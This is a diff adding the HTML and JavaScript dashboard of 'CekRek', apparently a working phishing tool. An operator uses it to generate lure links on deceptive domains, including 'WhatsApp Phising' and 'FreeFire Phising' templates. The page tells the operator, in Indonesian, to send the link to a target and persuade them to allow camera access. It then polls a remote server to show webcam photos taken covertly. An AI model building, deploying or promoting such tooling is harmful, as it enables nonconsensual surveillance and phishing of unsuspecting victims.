@@ -1,0 +1,402 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="https://www.shareicon.net/data/512x512/2016/03/26/739788_camera_512x512.png">
+    <title>CekRek</title>
+    <link rel="canonical" href="https://getbootstrap.com/docs/4.0/examples/album/">
+    <!-- Bootstrap core CSS -->
+    <link href="https://getbootstrap.com/docs/4.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Custom styles for this template -->
+    <link href="https://getbootstrap.com/docs/4.0/examples/album/album.css" rel="stylesheet">
+    <style type="text/css">
+      .loading {
+          background-color: white;
+          width: 100%;
+          display: fixed
+      }
+      .hidden {
+        opacity:0;
+      }
+      .console-underscore {
+         display:inline-block;
+        position:relative;
+      }
+ a {
+  position: relative;
+  text-decoration: none;
+}
+ a:hover {
+  color: #ff0000;
+}
+ a:before {
+  content: "";
+  position: absolute;
+  width: 100%;
+  height: 2px;
+  bottom: 0;
+  left: 0;
+  background-color: #ff0000;
+  visibility: hidden;
+  -webkit-transform: scaleX(0);
+  transform: scaleX(0);
+  -webkit-transition: all 0.3s ease-in-out 0s;
+  transition: all 0.3s ease-in-out 0s;
+}
+ a:hover:before {
+  visibility: visible;
+  -webkit-transform: scaleX(1);
+  transform: scaleX(1);
+}
+    </style>
+  </head>
+  <body>
+    <header>
+      <div class="collapse bg-dark" id="navbarHeader">
+        <div class="container">
+          <div class="row">
+            <div class="col-sm-8 col-md-4 py-4">
+              <h4 class="text-white">About</h4>
+              <p class="text-white">Take a webcam shot of the target.</p>
+            </div>
+            <div class="col-sm-5 col-md-4 py-4">
+              <h4 class="text-white">Note</h4>
+              <p class="text-white">- this tool is made just for fun: D<br>- every day at 01.05 AM all data will be deleted automatically.</p>
+            </div>
+            <div class="col-sm-12 col-md-4 py-4">
+              <h5 class="text-white">
+                <a href="https://github.com/404rgr" target="_blank">
+                  <span id='text'></span>
+                  <div class='console-underscore' id='console' style="color: red">&#95;</div>
+                </a>
+              </h5>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="navbar navbar-dark bg-dark box-shadow">
+        <div class="container d-flex justify-content-between">
+          <div class="navbar-brand d-flex align-items-center">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
+            <strong>Cekrek</strong>
+          </div>
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarHeader" aria-controls="navbarHeader" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+        </div>
+      </div>
+    </header>
+    <main role="main">
+      <section class="jumbotron" style="display: none;" id="zone">
+        <div class="container">
+          <h2 style="padding: 12px" class="jumbotron-heading">Create Your Link<b>!</b></h2>
+                <form method="POST" onsubmit="return false" name="pausiForm">
+                  <div class="form-group row">
+                      <label for="pekerjaan" class="col-sm-2 col-form-label">Template</label>
+                      <div class="col-sm-10">
+                        <select id="pekerjaan" class="form-control" name="temp">
+                          <option value="0">Default (Hello World)</option>
+                          <option value="1">Covid-19 Statistics</option>
+                          <option value="2">Google</option>
+                          <option value="3">Facebook</option>
+                          <option value="4">WhatsApp Phising</option>
+                          <option value="5">FreeFire Phising</option>
+                        </select>
+                      </div>
+                  </div>
+                  <div class="form-group row">
+                    <label for="nama" class="col-sm-2 col-form-label">Url Name</label>
+                    <div class="col-sm-10">
+                      <input type="text" class="form-control" placeholder="this-example" name="subdomain">
+                    </div>
+                  </div>
+                  <div class="form-group row">
+                      <label for="pekerjaan" class="col-sm-2 col-form-label">Domain</label>
+                      <div class="col-sm-10">
+                        <select class="form-control" name="domain">
+                          <option value="2">id-event.my.id</option>
+                          <option value="0">m.sejutamilyarder.com</option>
+                          <option value="1">n.nikahku.xyz</option> 
+                          <option value="3">api.api-pusinfo.com</option>
+                          <option value="4">my.ikahi.org</option>
+                          <option value="5">on.itwo.online</option>
+                          <option value="6">id.telkomsel.eu.org</option>
+                          <option value="7">site.jalursukses.com</option>
+                          <option value="8">me.nyeduh.com</option>
+                          <option value="9">www.pubgoff.com</option>
+                          <option value="10">tidur.dikelas.online</option>
+                        </select>
+                      </div>
+                  </div>
+                </form>
+                  <button onclick='cekrek()' class="btn btn-primary" type="button">Submit</button>
+        </div>
+      </section>
+      <div class="container" id="pausi2" style="display: none;">
+        <div style="height: 50px"></div>
+        <center>
+            <h2 style="padding: 12px" class="jumbotron-heading">Loading...</h2>
+            <div id='loadings' class="loading" style="display:block;">
+              <img src="https://mir-s3-cdn-cf.behance.net/project_modules/disp/35771931234507.564a1d2403b3a.gif" width="200" height="200">
+            </div>
+        </center>
+        <div style="height: 150px"></div>
+      </div>
+      <div class="container" id="xsec" style="display: none;">
+        <h2 style="padding: 12px" class="jumbotron-heading">Load Images Result</h2>
+        <div class="box">
+          <div class="form-group row">
+            <label for="nama" class="col-sm-2 col-form-label">Url Result</label>
+            <div class="col-sm-10">
+              <strong id="link">https://site.com/</strong>
+            </div>
+          </div>
+          <div class="form-group row">
+            <label for="nama" class="col-sm-2 col-form-label">Message</label>
+            <div class="col-sm-10">
+              <p>kirim link diatas ke target kamu dan suruh/bujuk dia ketika masuk ke situs untuk klik izinkan (untuk akses ke kamera), dan pastikan juga target yang dikirimkan link ini browsernya support javascript.</p>
+            </div>
+            <div style="padding: 17px">
+              <button type="submit" class="btn btn-danger" onclick="cls()">Restart & Clear Cookies!</button>
+            </div>
+          </div>
+          <div class="progress">
+            <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100" style="width: 100%;height: 100%">Taking pictures automatically...</div>
+          </div>
+        </div>
+        <div class="row" id="results">
+          <!--<div id="results"></div>-->
+        </div>
+      </div>
+    </main>
+    <footer class="text-muted">
+      <div class="container">
+        <p>Cekrek &copy; 2020 | <a href="http://zone-xsec.com/">zone-xsec.com</a> - <a href="http://xploitsecid.or.id/">xploitsecid.or.id</a></p>
+      </div>
+    </footer>
+    <script type="text/javascript">
+    // due to some error, the subdomain is now changed to url name
+    //clear();
+    //setCookie('x_xsec', 'ok', 1);
+    var im = 'https://tools.zone-xsec.com/priv_archive';
+    var cookies = listCookie();
+    var zoneXsec = new XMLHttpRequest();
+    //alert(cookies['x_xsec']);
+    //alert(cookies['x_urls']);
+    //alert(cookies['PHPSESSID']);
+    if(cookies['x_xsec'] == 'ok' && cookies['x_urls'] && cookies['PHPSESSID']){
+      var z = document.getElementById("xsec");
+      z.style.display = "Block";
+      if (cookies['x_urls']) {
+        document.getElementById("link").innerHTML = decodeURIComponent(cookies['x_urls']);
+        getImg();
+      }
+    }else{
+      document.getElementById('zone').style.display = "Inline";
+    }
+    function cekrek(){
+      if (valid()) {
+        document.getElementById('zone').style.display = "none";
+        document.getElementById('pausi2').style.display = "Block";
+        var temp = document.forms['pausiForm']["temp"].value;
+        var subdomain = document.forms['pausiForm']["subdomain"].value;
+        var domain = document.forms['pausiForm']["domain"].value;
+        sendRequest(temp,domain,subdomain);
+       }
+    }
+    function valid() {
+      var temp = document.forms['pausiForm']["temp"].value;
+      var subdomain = document.forms['pausiForm']["subdomain"].value;
+      var domain = document.forms['pausiForm']["domain"].value;
+      if (temp != "" && subdomain !="" && domain !="") {
+        return true;
+      }else{
+        alert('Harap isi semua form yang ada!');
+      }
+    }
+    function listCookie() {
+        var cookies = { };
+        if (document.cookie && document.cookie != '') 
+        {
+            var split = document.cookie.split(';');
+            for (var i = 0; i < split.length; i++) 
+            {
+                var name_value = split[i].split("=");
+                name_value[0] = name_value[0].replace(/^ /, '');
+                cookies[decodeURIComponent(name_value[0])] = decodeURIComponent(name_value[1]);
+            }
+        }
+        return cookies;
+    }
+    function setCookie(cname, cvalue, exdays) {
+        var d = new Date();
+        d.setTime(d.getTime() + (exdays*24*60*60*1000));
+        var expires = "expires="+ d.toUTCString();
+        document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+    }
+    function cls(){
+      var tanya_clear = confirm('Yakin untuk Restart & Clear Result?');
+      if (tanya_clear) {
+        clear();
+      }
+    }
+    function clear(){
+      setCookie('x_xsec', 'no', -1);
+      setCookie('x_urls', 'no', -1);
+      setCookie('PHPSESSID', 'no', -1);
+      window.location.href=window.location.href;
+    }
+        
+    function sendRequest(temp,domain,subdomain) {
+      zoneXsec.onreadystatechange = pausi_write_text;
+      zoneXsec.open("POST", "https://tools.zone-xsec.com/api/cekrek.php?zx=create");
+      zoneXsec.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      zoneXsec.setRequestHeader("referer", document.location);
+      zoneXsec.send("temp="+temp+"&domain="+domain+"&subdomain="+subdomain+"&PHPSESSID="+cookies['PHPSESSID']);
+    }
+        
+    function pausi_write_text() {
+       if(zoneXsec.readyState === 4) {
+        //alert(zoneXsec.status);
+        //alert(zoneXsec.responseText);
+          document.getElementById('pausi2').style.display = 'none';
+          if(zoneXsec.status == 200) {
+            if (zoneXsec.responseText == 'please try again') {
+              alert("please try again");
+              document.getElementById('zone').style.display = "Inline";
+              document.getElementById('xsec').style.display = "none";
+            }else{
+              document.getElementById('xsec').style.display = "Block";
+              setCookie('x_urls', encodeURIComponent(zoneXsec.responseText), 1);
+              setCookie('x_xsec', 'ok', 1);
+              document.getElementById("link").innerHTML = zoneXsec.responseText;
+              document.getElementById('xsec').style.display = "Block";
+              getImg();
+            }
+          } else {
+             alert('Any problems, please contact zeerx7@gmail.com');
+             document.getElementById('zone').style.display = "Inline";
+          }
+       }
+    }
+    function getImg(){
+      getResult();
+      setInterval("getResult()", 3000);
+    }
+    function getResult() {
+       zXs = new XMLHttpRequest();
+       zXs.onreadystatechange = pausi_write_result;
+       zXs.open("POST", "https://tools.zone-xsec.com/api/cekrek.php?zx=get_json");
+       zXs.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+       zXs.setRequestHeader("referer", document.location);
+       zXs.send("PHPSESSID="+cookies['PHPSESSID']);
+    }
+    function pausi_write_result(){
+      if(zXs.readyState === 4) {
+        //alert(zXs.responseText);
+          if(zXs.status == 200) {
+            if (zXs.responseText == 'No Your Session in db!') {
+              alert("Sepertinya tidak ada session kamu di server kami.");
+              var con = confirm("Harap Klik *OK* untuk clear cookie dan memulai kembali tools ini.")
+              if (con) {
+                clear();
+              }
+            }else if (zXs.responseText) {
+              //document.write(zXs.responseText);
+              var sad = JSON.parse(zXs.responseText);
+              var finish = sad.map(tired=> {
+                return `<div class="col-lg-4 col-md-4 col-sm-5">
+            <img src="priv_archive=${tired}" class="img-thumbnail" width="100%">
+          `;
+                });
+              document.getElementById('results').innerHTML = finish.join('</div>');
+              //document.write(finish.join('<br>'));
+            }
+          } else {
+             alert('Any problems, please contact zeerx7@gmail.com');
+             document.getElementById('zone').style.display = "Inline";
+          }
+      }
+    }
+  </script>
+
+    <script type="text/javascript">
+      CT(['This tool coded by @pausi404','finished on 15/11/2020.'], 'text',['white','white']);
+      function CT(words, id, colors) {
+        if (colors === undefined) colors = ['#fff'];
+        var visible = true;
+        var con = document.getElementById('console');
+        var letterCount = 1;
+        var x = 1;
+        var waiting = false;
+        var target = document.getElementById(id)
+        target.setAttribute('style', 'color:' + colors[0])
+        window.setInterval(function() {
+
+          if (letterCount === 0 && waiting === false) {
+            waiting = true;
+            target.innerHTML = words[0].substring(0, letterCount)
+            window.setTimeout(function() {
+              var usedColor = colors.shift();
+              colors.push(usedColor);
+              var usedWord = words.shift();
+              words.push(usedWord);
+              x = 1;
+              target.setAttribute('style', 'color:' + colors[0])
+              letterCount += x;
+              waiting = false;
+            }, 1000)
+          } else if (letterCount === words[0].length + 1 && waiting === false) {
+            waiting = true;
+            window.setTimeout(function() {
+              x = -1;
+              letterCount += x;
+              waiting = false;
+            }, 1000)
+          } else if (waiting === false) {
+            target.innerHTML = words[0].substring(0, letterCount)
+            letterCount += x;
+          }
+        }, 40)
+        window.setInterval(function() {
+          if (visible === true) {
+            con.className = 'console-underscore hidden'
+            visible = false;
+
+          } else {
+            con.className = 'console-underscore'
+
+            visible = true;
+          }
+        }, 400)
+      }
+      $(".loading").height($(window).height());
+      $(".loading").width($(window).width());
+      $(".loading img").css({
+          paddingTop: ($(".loading").height() - $(".loading img").height()) / 2,
+          paddingLeft: ($(".loading").width() - $(".loading img").width()) / 2
+      });
+      $(window).resize(function () {
+          "use strict";
+          $(".loading").height($(window).height());
+          $(".loading").width($(window).width());
+          $(".loading img").css({
+              paddingTop: ($(".loading").height() - $(".loading img").height()) / 2,
+              paddingLeft: ($(".loading").width() - $(".loading img").width()) / 2
+          });
+      });
+
+    </script>
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="http://tools.zone-xsec.com/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
+    <script src="https://getbootstrap.com/docs/4.0/assets/js/vendor/popper.min.js"></script>
+    <script src="https://getbootstrap.com/docs/4.0/dist/js/bootstrap.min.js"></script>
+    <script src="https://getbootstrap.com/docs/4.0/assets/js/vendor/holder.min.js"></script>
+  </body>
+</html>
